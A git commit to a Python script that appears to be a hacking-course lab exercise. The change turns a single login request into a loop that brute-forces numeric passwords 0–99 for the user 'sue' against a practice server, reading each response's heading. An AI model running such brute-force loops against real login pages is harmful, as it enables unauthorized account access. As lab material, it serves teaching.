6570ba725059f2661ebc8526e42b1036e7c7894e
Ecw0rk <ecwork@gmail.com>
2017-09-16 16:13:03 -0700

    New update

--- Proj_2xa.py
+++ Proj_2xa.py
@@ -1,8 +1,10 @@
 #!/usr/bin/python
 
 import socket
+import bs4
+user = 'sue'
 socket.setdefaulttimeout(2)
-s = socket.socket()
+# s = socket.socket()
 
 req1 = """POST /python/login2.php HTTP/1.1
 Host: attackdirect.samsclass.info
@@ -20,10 +22,13 @@ Cookie: __cfduid=defa9068e57cd00aaeaf3eff82897926c1374014337
 
 """
 
-user = raw_input("Username: ")
-pw = raw_input("Password: ")
-length = len(user) + len(pw) + 5
-s.connect(("attackdirect.samsclass.info", 80))
-s.send(req1 + str(length) + '\n' + req2 + "u=" + user + "&p=" + pw + '\n')
-print s.recv(1024)
-s.close()
+for pw in range(100):
+    s = socket.socket()
+    length = len(user) + len(str(pw)) + 5
+    s.connect(("attackdirect.samsclass.info", 80))
+    s.send(req1 + str(length) + '\n' + req2 + "u=" + user + "&p=" + str(pw) + '\n')
+    html = s.recv(1024)
+    soup = bs4.BeautifulSoup(html, 'html5lib')
+    # print html
+    print pw, soup.select('h1')[0]
+    s.close()
